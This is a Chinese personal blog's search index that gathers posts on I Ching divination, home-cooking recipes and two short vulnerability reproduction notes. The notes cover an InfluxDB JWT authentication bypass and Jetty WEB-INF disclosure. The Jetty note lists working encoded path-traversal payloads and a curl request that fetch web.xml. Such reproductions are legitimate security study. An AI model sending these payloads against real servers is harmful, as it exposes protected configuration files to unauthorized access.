<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>数术-先天八卦</title>
      <link href="posts/6199.html"/>
      <url>posts/6199.html</url>
      
        <content type="html"><![CDATA[<h2 id="Ax-先天八卦由来"><a href="#Ax-先天八卦由来" class="headerlink" title="Ax 先天八卦由来"></a>Ax 先天八卦由来</h2><p>相传伏羲氏创造了先天八卦图。伏羲氏借着观看日月星宿的分布，俯瞰地球的自然环境，画八卦以配河图，成为先天八卦。因此先天八卦也称伏羲八卦。按哲学的说法，先天八卦描绘的是宇宙的本源，为存在之始。</p><h2 id="Bx-先天八卦基础"><a href="#Bx-先天八卦基础" class="headerlink" title="Bx 先天八卦基础"></a>Bx 先天八卦基础</h2><p><strong>（1）八基本卦的符号歌诀</strong></p><p>乾三连（☰），坤六断（☷），</p><p>震仰盂（☳），艮覆碗（☶），</p><p>离中虚（☲），坎中满（☵），</p><p>兑上缺（☱），巽下断（☴）。</p><p>这歌诀不但是为了帮助记忆八卦符号，同时也是各卦的象征之一。</p><p><strong>（2）八卦的基础象</strong></p><p>乾（☰）：天</p><p>坤（☷），地</p><p>震（☳），雷</p><p>艮（☶），山</p><p>离（☲），火</p><p>坎（☵），水</p><p>兑（☱），泽</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20230524091944313.png"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 数术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 先天八卦 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>鬼谷子</title>
      <link href="posts/3fc8.html"/>
      <url>posts/3fc8.html</url>
      
        <content type="html"><![CDATA[<h2 id="鬼谷子"><a href="#鬼谷子" class="headerlink" title="鬼谷子"></a>鬼谷子</h2><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> 玄学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>复现ECR-2023-0507酸辣青丝</title>
      <link href="posts/802b.html"/>
      <url>posts/802b.html</url>
      
        <content type="html"><![CDATA[<h2 id="Ax-Introduction"><a href="#Ax-Introduction" class="headerlink" title="Ax Introduction"></a>Ax Introduction</h2><blockquote><p>独立的思维需要自我的沉淀与归纳之后的创新而产生，做菜也是如此。</p></blockquote><p>编号：ECR-2023-0507酸辣青丝</p><p>等级：<font color="red"><strong>严赞</strong></font></p><p>版本：v 1.0</p><blockquote><p>ECR（Enomothem Cooking Recurrence）伊诺烹饪法复现编号，由Enomothem于2023年2月24日由发现第一次做江西炒粉意外好吃而创建第一个编号ECR-2023-0224，用于记录根据平常烹饪而创新得到的好吃的食物，或者是觉得还不错的食物。等级有严赞，高赞，中赞和低赞。</p></blockquote><h2 id="Bx-Preparation"><a href="#Bx-Preparation" class="headerlink" title="Bx Preparation"></a>Bx Preparation</h2><p>准备的食材</p><ul><li>2个细丝瓜: （Luffa aegyptiaca Miller ） </li><li>其它：<ul><li>各种辣椒、泡椒6个、小米椒6个、干辣椒6个、青椒6个</li><li>蒜</li><li>姜</li></ul></li></ul><p>佐料</p><ul><li><p>食用油</p></li><li><p>生抽</p></li><li><p>老抽</p></li><li><p>醋</p></li><li><p>香油</p></li><li><p>耗油</p></li><li><p>鸡精</p></li><li><p>盐</p></li><li><p>五香粉</p></li><li><p>十三香</p></li></ul><h2 id="Cx-Recurrence"><a href="#Cx-Recurrence" class="headerlink" title="Cx Recurrence"></a>Cx Recurrence</h2><blockquote><p>复现步骤，味道取决于当时的环境，厨房设施，对细节的把控。所以记录下来尽可能的还原味道。</p></blockquote><p>第一步 去皮洗好切好</p><p>使用滚刀块切法</p><p>第二步 开始操作</p><p>开始爆香，把油放进去，各种辣椒，蒜。</p><p>放丝瓜，各种小科技，生抽、醋、香油、五香粉、耗油、辣椒面、鸡精、盐。</p><p>第三步 出锅</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20230516204616915.png"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 做饭 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 毛豆炒肉 </tag>
            
            <tag> ECR-2023-0507 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>复现ECR-2023-0420毛豆炒肉</title>
      <link href="posts/aeff.html"/>
      <url>posts/aeff.html</url>
      
        <content type="html"><![CDATA[<h2 id="Ax-Introduction"><a href="#Ax-Introduction" class="headerlink" title="Ax Introduction"></a>Ax Introduction</h2><blockquote><p>独立的思维需要自我的沉淀与归纳之后的创新而产生，做菜也是如此。</p></blockquote><p>编号：<font color="blue">ECR-2023-0420毛豆炒肉</font></p><p>等级：<font color="red"><strong>严赞</strong></font></p><p>版本：v 1.0</p><blockquote><p>ECR（Enomothem Cooking Recurrence）伊诺烹饪法复现编号，由Enomothem于2023年2月24日由发现第一次做江西炒粉意外好吃而创建第一个编号ECR-2023-0224，用于记录根据平常烹饪而创新得到的好吃的食物，或者是觉得还不错的食物。等级有严赞，高赞，中赞和低赞。</p></blockquote><p>毛豆炒肉，这是我小时候非常喜欢吃的一道菜，我还记得小时候经常叫我妈妈说我要吃毛豆，我妈每次剥毛豆都叫我帮忙，但我每次都帮她剥两下就跑了，今天做这道菜我才体会到，真不容易啊，我以为以我的手速，不需要几下就可以完成，没想到，当我插上电饭煲煮饭，我就可以剥了，紧接着，电饭煲滴~的一声，原来饭都已经熟了，整整25分钟我终于完成了。</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20230423000933702.png"></p><p>2023年，4月20日，这一天意义非凡，777女士和我在一起了。不管是上个星期的那场梦的预言，还是我对她的言语、行为、眼神都深深的吸引着我，这世上竟有如此符合我预期的人，三观一致，专业一致，擅长一致，不擅长竟也是一致，而且又是那么的善良、聪明、热情、美丽。</p><p>一切表白都藏在了这优美的命令中：</p><pre class=" language-bash"><code class="language-bash">$ <span class="token function">chmod</span> 777 568520997$ <span class="token function">chown</span> enomothem:enomothem 568520997$ <span class="token keyword">echo</span> <span class="token string">"I love you"</span> <span class="token operator">|</span> wall$ <span class="token keyword">echo</span> <span class="token string">"I love you too"</span> <span class="token operator">|</span> wall</code></pre><p>关于我们，时间正好，不晚也不早，所以遇见了你，但又感叹相见恨晚，有人可能就会说了，这么快就在一起了，这不是快餐式恋爱吗，看起来的确挺快的，但如何定义快餐式恋爱呢，只是为了尝尝爱情的甜？我想我们是不一样的，有着共同的奋斗目标，有着同样的经历和话题，别的不说，就比如今天新出一个漏洞，我们就有得聊，毕竟漏洞是每天的常态。有人说我们互相不了解，但要是不迈出这一步，又怎会有更深了了解。</p><p>尝过你的饭菜，简直比我的厨艺好太多了。我要把你的厨艺偷学过来。陪你过了生日，我们在大屏幕上尝试XSS的payload，你也在我的博客上按照我写的教程终于把博客搭建起来了，我的成就感又+1，因为这个教程我是熬了很多夜，挠掉了很多头发才写好的，你是第四个看我博客把他搭建起来的人，这也说明了这个教程的完善性和稳定性。</p><p>关于爱情观，我的理想型就是，互相支持，互相激励，互相扶持，有一个共同的目标。我想我等的那个人就是你。</p><p>当然，是一段感情关系就会有暧昧期、热恋和最后的平淡，我们可能会有争吵的一天，但我相信，这是好事，因为我们展示了缺点，这是我们最真实的自己，然后通过磨合使我们感情变得更加坚定。我会珍惜你，保护你，陪伴你。</p><p>学安全的嘛，更需要居安思危，所以我考虑的比较长远，而不是仅看到眼前。</p><p>祝我们，相濡以沫。</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20230423001359854.png"></p><h2 id="Bx-Preparation"><a href="#Bx-Preparation" class="headerlink" title="Bx Preparation"></a>Bx Preparation</h2><p>准备的食材</p><ul><li>毛豆:  其实毛豆其实就是黄豆，毛豆又叫菜用大豆、枝豆，是处于新鲜状态下的黄豆</li><li>猪肉</li><li>其它：<ul><li>辣椒</li><li>蒜</li><li>姜</li></ul></li></ul><p>佐料</p><ul><li>食用油</li><li>味极鲜</li><li>鸡精</li><li>盐</li><li>十三香</li></ul><h2 id="Cx-Recurrence"><a href="#Cx-Recurrence" class="headerlink" title="Cx Recurrence"></a>Cx Recurrence</h2><blockquote><p>复现步骤，味道取决于当时的环境，厨房设施，对细节的把控。所以记录下来尽可能的还原味道。</p></blockquote><p>第一步 洗好切好</p><p>毛豆剥好，肉腌制一下【已经掌握完美比例料理】。辣椒洗好切好，葱姜蒜切好。</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20230423000924954.png"></p><p>第二步 开始操作</p><p>将毛豆水2分钟。</p><p>然后炒肉，这个基本操作，然后放入葱姜蒜，辣椒，毛豆，加点调料。</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20230423001027326.png"></p><p>第三步 出锅</p><p>真的不错。</p><p>改进建议：</p><p>感觉剥毛豆有点费时间。。</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 做饭 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 毛豆炒肉 </tag>
            
            <tag> ECR-2023-0420 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>复现ECR-2023-0415酸辣金丝</title>
      <link href="posts/85b4.html"/>
      <url>posts/85b4.html</url>
      
        <content type="html"><![CDATA[<h2 id="Ax-Introduction"><a href="#Ax-Introduction" class="headerlink" title="Ax Introduction"></a>Ax Introduction</h2><blockquote><p>独立的思维需要自我的沉淀与归纳之后的创新而产生，做菜也是如此。</p></blockquote><p>编号：复现ECR-2023-0415酸辣金丝</p><p>等级：<font color="red"><strong>严赞</strong></font></p><p>版本：v 1.0</p><blockquote><p>ECR（Enomothem Cooking Recurrence）伊诺烹饪法复现编号，由Enomothem于2023年2月24日由发现第一次做江西炒粉意外好吃而创建第一个编号ECR-2023-0224，用于记录根据平常烹饪而创新得到的好吃的食物，或者是觉得还不错的食物。等级有严赞，高赞，中赞和低赞。</p></blockquote><h2 id="Bx-Preparation"><a href="#Bx-Preparation" class="headerlink" title="Bx Preparation"></a>Bx Preparation</h2><p>准备的食材</p><ul><li>土豆（Solanum tuberosum L.）</li><li>其它：<ul><li>辣椒、泡脚、红辣椒、干辣椒</li><li>蒜</li><li>姜</li></ul></li></ul><p>佐料</p><ul><li>食用油</li><li>味极鲜</li><li>鸡精</li><li>盐</li><li>十三香</li></ul><h2 id="Cx-Recurrence"><a href="#Cx-Recurrence" class="headerlink" title="Cx Recurrence"></a>Cx Recurrence</h2><blockquote><p>复现步骤，味道取决于当时的环境，厨房设施，对细节的把控。所以记录下来尽可能的还原味道。</p></blockquote><p>第一步 洗好</p><p>弄成丝，准备好</p><p>第二步 做菜</p><p>放油，爆香蒜和辣椒，放土豆丝，之后，放各种科技，生抽一点点，有啥放啥</p><p>放醋。</p><p>第三步 出锅</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20230516203749381.png"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 做饭 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 酸辣金丝 </tag>
            
            <tag> ECR-2023-0415酸辣金丝 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>复现ECR-2023-0403莲藕炒肉</title>
      <link href="posts/f2ce.html"/>
      <url>posts/f2ce.html</url>
      
        <content type="html"><![CDATA[<h2 id="Ax-Introduction"><a href="#Ax-Introduction" class="headerlink" title="Ax Introduction"></a>Ax Introduction</h2><blockquote><p>独立的思维需要自我的沉淀与归纳之后的创新而产生，做菜也是如此。</p></blockquote><p>编号：ECR-2023-0403莲藕炒肉</p><p>等级：高赞</p><p>版本：v 1.0</p><blockquote><p>ECR（Enomothem Cooking Recurrence）伊诺烹饪法复现编号，由Enomothem于2023年2月24日由发现第一次做江西炒粉意外好吃而创建第一个编号ECR-2023-0224，用于记录根据平常烹饪而创新得到的好吃的食物，或者是觉得还不错的食物。等级有严赞，高赞，中赞和低赞。</p></blockquote><p>这段时间在弄bWAPP靶场，因为临近考试了。复习一下基础知识。</p><h2 id="Bx-Preparation"><a href="#Bx-Preparation" class="headerlink" title="Bx Preparation"></a>Bx Preparation</h2><p>准备的食材</p><ul><li>莲藕（lotus-root）</li><li>猪肉</li><li>其它：<ul><li>辣椒</li><li>蒜</li><li>姜</li></ul></li></ul><p>佐料</p><ul><li>食用油</li><li>味极鲜</li><li>鸡精</li><li>盐</li><li>白砂糖</li></ul><h2 id="Cx-Recurrence"><a href="#Cx-Recurrence" class="headerlink" title="Cx Recurrence"></a>Cx Recurrence</h2><blockquote><p>复现步骤，味道取决于当时的环境，厨房设施，对细节的把控。所以记录下来尽可能的还原味道。</p></blockquote><p>第一步 洗好切好</p><p>藕洗好切好，肉腌制一下【已经掌握完美比例料理】。辣椒洗好切好，葱姜蒜切好。</p><p>第二步 开始操作</p><p>将藕片焯水一下。</p><p>然后炒肉，这个基本操作，然后放入葱姜蒜，辣椒，莲藕，加点调料。</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20230403004153933.png"></p><p>第三步 出锅</p><p>真的不错。</p><p>改进建议：</p><p>朋友说这个有黑斑的就是老的。</p><p>朋友说这个加个泡椒非常好吃。</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 做饭 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 莲藕炒肉 </tag>
            
            <tag> ECR-2023-0403 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>复现ECR-2023-0330豆角炒肉</title>
      <link href="posts/da74.html"/>
      <url>posts/da74.html</url>
      
        <content type="html"><![CDATA[<h2 id="Ax-Introduction"><a href="#Ax-Introduction" class="headerlink" title="Ax Introduction"></a>Ax Introduction</h2><blockquote><p>独立的思维需要自我的沉淀与归纳之后的创新而产生，做菜也是如此。</p></blockquote><p>编号：ECR-2023-0330豆角炒肉</p><p>等级：高赞</p><p>版本：v 1.0</p><blockquote><p>ECR（Enomothem Cooking Recurrence）伊诺烹饪法复现编号，由Enomothem于2023年2月24日由发现第一次做江西炒粉意外好吃而创建第一个编号ECR-2023-0224，用于记录根据平常烹饪而创新得到的好吃的食物，或者是觉得还不错的食物。等级有严赞，高赞，中赞和低赞。</p></blockquote><p>最近博客关停了一段时间，因为备案的事情搁置了一下下。</p><h2 id="Bx-Preparation"><a href="#Bx-Preparation" class="headerlink" title="Bx Preparation"></a>Bx Preparation</h2><p>准备的食材</p><ul><li>肉</li><li>豆角（Vigna unguiculata subsp. sesquipedalis (L.) Verd）</li><li>其它：<ul><li>蒜</li><li>姜</li></ul></li></ul><p>佐料</p><ul><li>食用油</li><li>味极鲜</li><li>鸡精</li><li>盐</li></ul><h2 id="Cx-Recurrence"><a href="#Cx-Recurrence" class="headerlink" title="Cx Recurrence"></a>Cx Recurrence</h2><blockquote><p>复现步骤，味道取决于当时的环境，厨房设施，对细节的把控。所以记录下来尽可能的还原味道。</p></blockquote><p>第一步 洗好切好</p><p>洗好切好。我是将豆角切好之后再洗的。</p><p>第二步 开始操作</p><p>顺序不要乱，先腌制肉，然后再去弄豆角的。</p><p>先用油炒一下豆角，炒到七八分熟捞出来。</p><p>然后炒肉，差不多把豆角放入，炒几下放调料。</p><p>第三步 出锅</p><p>ok</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20230403004831442.png"></p><p>总结</p><p>确实可以</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 做饭 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习随笔 </tag>
            
            <tag> 豆角炒肉 </tag>
            
            <tag> ECR-2023-0330 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IRF-InfluxDB身份验证绕过</title>
      <link href="posts/6ed2.html"/>
      <url>posts/6ed2.html</url>
      
        <content type="html"><![CDATA[<h2 id="I"><a href="#I" class="headerlink" title="I"></a>I</h2><blockquote><p>这是IRF系列的第一篇。何为IRF，IRF是Enomothem于2023年1月31日提出的漏洞管理信息方法，IRF分别为Information、Recurrence和Fix plan</p><p>I: 漏洞的基本信息、物体Object（什么应用）、时间Time（可选）、空间Space（版本范围，受影响范围）、编号（CVE等等）</p><p>R: 漏洞复现方法、具备的条件</p><p>F: 漏洞修复计划。</p></blockquote><p><strong>基本信息</strong></p><p>1.7.6之前的InfluxDB在services/httpd/handler中的身份验证函数中存在身份验证绕过漏洞。因为JWT令牌可能有一个空的SharedSecret(又名共享秘密)。利用检查服务器是否易受攻击，然后它会尝试获取远程查询 shell。它内置了用户名暴力破解服务。</p><p><strong>OTS</strong></p><ul><li><p>InfluxDB &lt; 1.7.6</p></li><li><p>CVE：CVE-2019-20933</p><p>CNVD：CNVD-2022-06547</p></li></ul><h2 id="R"><a href="#R" class="headerlink" title="R"></a>R</h2><p><strong>分析</strong></p><p><a href="https://blog.csdn.net/weixin_45751765/article/details/123181716">https://blog.csdn.net/weixin_45751765/article/details/123181716</a></p><p><strong>复现</strong></p><p><img src="https://lit.enomothem.com/zhixinghe/image-20230315092039619.png"></p><p>工具下载：<a href="https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933">https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933</a></p><h2 id="F"><a href="#F" class="headerlink" title="F"></a>F</h2><p>1.更新版本</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Web漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IRF </tag>
            
            <tag> 身份绕过 </tag>
            
            <tag> CVE-2019-20933 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IRF-Jetty_WEB-INF_敏感信息泄露漏洞</title>
      <link href="posts/dd3b.html"/>
      <url>posts/dd3b.html</url>
      
        <content type="html"><![CDATA[<h2 id="I"><a href="#I" class="headerlink" title="I"></a>I</h2><blockquote><p>这是IRF系列的第一篇。何为IRF，IRF是Enomothem于2023年1月31日提出的漏洞管理信息方法，IRF分别为Information、Recurrence和Fix plan</p><p>I: 漏洞的基本信息、物体Object（什么应用）、时间Time（可选）、空间Space（版本范围，受影响范围）、编号（CVE等等）</p><p>R: 漏洞复现方法、具备的条件</p><p>F: 漏洞修复计划。</p></blockquote><p><strong>基本信息</strong></p><p>Eclipse Jetty是一个开源的servlet容器，它为基于Java的Web容器提供运行环境。</p><p>在Jetty9.4.37版本中，为了符合RFC3986中的规范，选择性地支持可能有歧义解释的URI，默认模式允许URL编码，简单看下RFC3986（替代RFC2396）的规定<br>其大致意思是：.和..称为点段，都是为路径名层次结构中的相对引用而定义的，它们在一些操作系统文件目录结构中分别代表当前目录和父目录。但是与文件系统不同的是，这些点段仅在 URI 路径中解释层次结构，并作为解析过程的一部分被删除。也就是说在解析URI路径时，需要先处理.和..,Jetty为了符合这种处理方式，却导致了一系列的漏洞产生，首先是在9.4.39版本中修复了CVE-2021-28164，然后出现了新的绕过，其又在9.4.43版本中修复了CVE-2021-34429。</p><p>Jetty在9.4.40后修复了因为%2e导致的敏感信息泄露漏洞<a href="https://github.com/vulhub/vulhub/tree/master/jetty/CVE-2021-28164">CVE-2021-28164</a>，但这个修复是不完全的，通过下面三种方式可以进行绕过：</p><p>下面三种方式可以进行绕过：</p><ul><li>unicode形式URL编码：/%u002e/WEB-INF/web.xml</li><li>\0组合.导致的绕过：/.%00/WEB-INF/web.xml</li><li>\0组合..导致的绕过：/a/b/..%00/WEB-INF/web.xml</li></ul><p><strong>OTS</strong></p><ul><li><p>Jetty 9.4.37-9.4.42, 10.0.1-10.0.5, 11.0.1-11.0.5</p></li><li><p>CVE-2021-28164</p><p>CVE-2021-34429</p><p>CVE-2021-28169</p></li></ul><h2 id="R"><a href="#R" class="headerlink" title="R"></a>R</h2><p><strong>分析</strong></p><p><a href="http://example.com/WEB-INF/web.xml">http://example.com/%2e/WEB-INF/web.xml</a></p><p><strong>复现CVE-2021-28164</strong></p><p>直接访问/WEB-INF/web.xml将会返回404页面</p><p>使用/%2e/WEB-INF/web.xml来绕过限制下载web.xml：</p><p><strong>复现CVE-2021-34429</strong></p><p>可以使用一些编码字符来制作URI，以访问WEB-INF目录的内容和/或绕过一些安全限制。默认合规模式允许带有包含 %u002e 段的 URI 的请求访问WEB-INF目录中的受保护资源。</p><p>例如，/%u002e/WEB-INF/web.xml可以检索 web.xml 文件的请求。这可能会泄露有关 Web 应用程序实现的敏感信息。同样，编码的空字符可能会阻止正确的规范化，因此/.%00/WEB-INF/web.xml也会检索 web.xml 文件。</p><ol><li>照常访问/WEB-INF/web.xml，响应404.</li><li>使用%u002e绕过：/%u002e/WEB-INF/web.xml</li><li>使用空字符绕过：/.%00/WEB-INF/web.xml</li></ol><p><strong>复现CVE-2021-28169</strong></p><ol><li><p>正常通过<code>/static?/WEB-INF/web.xml</code>无法访问到敏感文件web.xml.</p></li><li><p>对字母“W”进行双重URL编码，即可绕过限制进行访问：</p><p>curl -v <a href="http://192.168.17.244:8080/static?/%2557EB-INF/web.xml">http://192.168.17.244:8080/static?/%2557EB-INF/web.xml</a></p></li></ol><h2 id="F"><a href="#F" class="headerlink" title="F"></a>F</h2><p>1.更新版本</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Web漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IRF </tag>
            
            <tag> 敏感信息泄露 </tag>
            
            <tag> Jetty </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数术-梅花易数</title>
      <link href="posts/b164.html"/>
      <url>posts/b164.html</url>
      
        <content type="html"><![CDATA[<h2 id="梅花易数"><a href="#梅花易数" class="headerlink" title="梅花易数"></a>梅花易数</h2><p>《梅花易数》是古代汉族占卜法之一。现在的八卦象数、梅花心易都是梅花易数的别称。相传为宋代易学家邵雍所着，是一部以易学中的数学为基础，结合易学中的“象学”进行占卜的书，相传邵雍运用时每卦必中，屡试不爽。梅花易数依先天八卦数理，<strong>即乾一，兑二，离三，震四，巽五，坎六，艮七，坤八，</strong>随时随地皆可起卦，取卦方式多种多样。</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20230310164324299.png"></p><p>目录</p><p>一、起源演变</p><p>二、基础知识</p><p>三、卦法</p><p>四、分类占断</p><p>五、实例选</p><p><strong>一、起源演变</strong></p><p>梅花易数可以产生<strong>声音、方位、时间、动静、地理、天时、人物、颜色、动植物等</strong>自然界或人类社会中的一切感知的事物异相，作为预测其发展趋势的方法。从而可洞悉其先机，达到知己知彼，订阅号红阳遁甲术。百战百胜的效果。</p><p>梅花易数之由来，相传为麻衣道人、陈希夷等一脉绵延传下之秘法，后来成为北宋邵康节先生常用的心易神数。此数经邵先生传下后，也使易学在占筮领域上，更有其重大的实用价值，也由邵康节后，才改名为梅花易数。</p><p>其名称的来源，相传有一天，邵康节先生进入梅花园赏花时，偶然见两只麻雀在枝头上争吵，后又见此二雀忽然争枝坠地，邵先生看到此种现象，即运用其心经易数，认为不动不占，不因事不占，今见二雀无故争枝坠地，怪哉！因觉有事而占之，断曰：<strong>明日当会有一邻女来攀折梅花，园丁不知而逐之，邻女惊恐自梅树跌下，伤到大腿。事后果然应验。</strong></p><p>后之学者因认为此卦例特殊，竟能断出与卦题不相干之事情来，为别种占法所不及，才将此种断法命名为“梅花易数”。</p><p>《梅花易数》根源于《易经》，何为《易》？一是变易，一种混沌现象，一个微小的变化能影响事物的发展（蝴蝶效应）；<strong>宇宙万物，变幻无常，时刻变化，人事也是如此。二是简易，一阴一阳，囊括了万种事物之理</strong>；有天就有地，有男就有女，有上就有下，有前就有后，都是相反相成，对立统一。三是不易，虽世间的事物错综复杂，变化多端，但是有一样东西永远不变的，那就是规律；天地运行，四季轮换，寒暑交替，冬寒夏热，月盈则亏，日午则偏，物极必反，这便是规律。</p><p>万事万物的发展均有定数与变数，定数有规律可循而变数无规律可循；定数中含有变数，变数中又含有定数，无论定数还是变数其大局均不变。古今来多数习易者未区分开定数与变数，混淆这概念。“定数”（规律）可根据事物的规律性预测其发展轨迹，“变数”（无规律）因变幻无常、可变因素太多无法准确预测。</p><p>万事万物虽错综复杂、变化多端，但亦有永恒不变的规律，既然存在有规律的一面，那么依据这些事物某些已知的因素，结合易理即可推算出其发展轨迹及趋势。</p><p><strong>二、基础知识</strong></p><p>梅花易数用的是先天之数。</p><p>乾一，兑二，离三，震四，巽五，坎六，艮七，坤八。</p><p><strong>八卦的基本含义</strong></p><p><img src="https://lit.enomothem.com/zhixinghe/image-20230310164804005.png"></p><p>乾：为天。五行属性为金。代表天，也代表金属或具有金属性质的东西。</p><p>兑：为泽，五行属性为金。代表沼泽，水性物，也代表金属或具有金属性质的东西。离：为火，五行属性为火。代表火、或具有火性的东西。</p><p>震：为雷，五行属性为木。代表雷，也代表树木、或具有木性的东西，大木。</p><p>巽：为风，五行属性为木。代表风，也代表草、藤或具有木性的东西，小木。</p><p>坎：为水，五行属性为水。代表水、或具有水性或流动性质的东西。</p><p>艮：为山，五行属性为土。代表山，也代表具有土性的东西。</p><p>坤：为地，五行属性为土。代表地、大地，也代表具有土性的东西。</p><p><strong>五行生克</strong></p><p>金生水，水生木，木生火，火生土，土生金。</p><p>金克木，木克土，土克水，水克火，火克金。</p><p><strong>八宫所属五行</strong></p><p>乾、兑金；坤、艮土；震、巽木；坎水；离火</p><p><strong>卦气旺</strong></p><p>震、巽木旺于春；离火旺于夏；乾、兑金旺于秋；坎水旺于冬；坤、艮旺于辰、戌、丑、未月。</p><p><strong>卦气衰</strong></p><p>春坤、艮；夏乾、兑；秋震、巽；冬离；辰、戌、丑、未坎。</p><p><strong>十天干五行</strong></p><p>甲乙东方木，丙丁南方火，戊己中央土，庚辛西方金，壬癸北方水。</p><p><strong>十二地支五行属相</strong></p><p>子水鼠；丑土牛；寅木虎；卯木兔；辰土龙；巳火蛇；午火马；未土羊；申金猴；酉金鸡；戌土狗；亥水